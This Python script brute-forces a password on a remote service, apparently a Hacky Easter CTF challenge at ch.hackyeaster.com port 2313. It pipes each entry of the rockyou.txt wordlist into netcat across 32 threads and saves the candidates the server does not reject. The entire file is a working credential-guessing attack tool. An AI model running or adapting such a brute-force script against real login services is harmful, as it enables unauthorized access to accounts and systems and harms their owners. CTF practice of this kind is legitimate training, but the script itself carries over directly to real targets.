import threading
import subprocess
from concurrent.futures import ThreadPoolExecutor

def check_password(password):
    process = subprocess.Popen(
        ["nc", "ch.hackyeaster.com", "2313"],
        stdin =subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=True)

    output = ""
    process.stdin.write(password)
    process.stdin.close()
    for line in process.stdout:
        output += line.strip()
    # print(output)
    return "is incorrect" not in output

def process_chunk(chunk, lock):
    # Iterate through each password in the chunk
    chunk_results = []
    for password in chunk:
        password = password.strip()
        # Call check_password and add to results if it returns True
        if check_password(password):
              chunk_results.append(password)

    # Print out the passwords that worked
    with lock:
        print("results that 'worked':", chunk_results)
        # results.append(chunk_results)
        return chunk_results

def save_results(results, file_lock):
    with file_lock:
        with open("rockyou_v2.txt", "a") as f:
            for password in results:
                f.write(password + "\n")

def read_file_in_chunks(file_path, chunk_size=1000):
    lock = threading.Lock()
    file_write_lock = threading.Lock()
    with open(file_path) as f:
        with ThreadPoolExecutor(max_workers=32) as executor:
            while True:
                # Read in a chunk of the file
                chunk = f.readlines(chunk_size)
                if not chunk:
                    break

                # Create a new thread to process this chunk
                future = executor.submit(process_chunk, chunk, lock)

                # Print out the passwords that worked once the future is complete
                future.add_done_callback(lambda f: save_results(f.result(), file_write_lock))

if __name__ == '__main__':
    read_file_in_chunks('rockyou.txt')